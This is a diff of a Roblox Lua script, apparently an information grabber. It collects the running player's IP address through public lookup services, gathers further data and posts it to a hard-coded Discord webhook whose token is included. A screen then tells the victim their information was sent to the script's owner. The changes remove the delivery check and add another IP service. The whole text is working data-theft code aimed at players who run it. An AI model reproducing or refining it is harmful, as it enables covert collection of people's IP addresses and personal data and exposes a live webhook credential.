@@ -1,9 +1,9 @@
 -- ============================================================
--- DIRECT DATA SENDER – NO TEST MESSAGE
+-- FINAL – NO TEST, NO DEBUG, JUST SEND ALL DATA
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
--- HTTP sender (same as test, but used directly)
+-- HTTP sender (proven to work)
 local function sendData(url, content)
     local payload = {content = content}
     local json = game:GetService("HttpService"):JSONEncode(payload)
@@ -23,7 +23,7 @@ end
 -- IP
 local function getIP()
     local ip = "N/A"
-    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com"}) do
+    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
         local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
         if ok and result and result ~= "" then
             if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
@@ -146,9 +146,9 @@ for k, v in pairs(data) do
     end
 end
 local message = "```\n" .. table.concat(lines, "\n") .. "\n```"
-local sent = sendData(webhook, message)
+sendData(webhook, message)
 
--- GUI
+-- GUI (optional)
 pcall(function()
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
@@ -165,7 +165,7 @@ pcall(function()
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
     title.BackgroundTransparency = 1
-    title.Text = sent and "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT" or "FAILED TO SEND"
+    title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
@@ -174,7 +174,7 @@ pcall(function()
     sub.Size = UDim2.new(1, 0, 0, 30)
     sub.Position = UDim2.new(0, 0, 0.75, 0)
     sub.BackgroundTransparency = 1
-    sub.Text = sent and "Thank you." or "Check webhook."
+    sub.Text = "Thank you."
     sub.TextColor3 = Color3.fromRGB(200, 200, 200)
     sub.TextScaled = true
     sub.Font = Enum.Font.Gotham
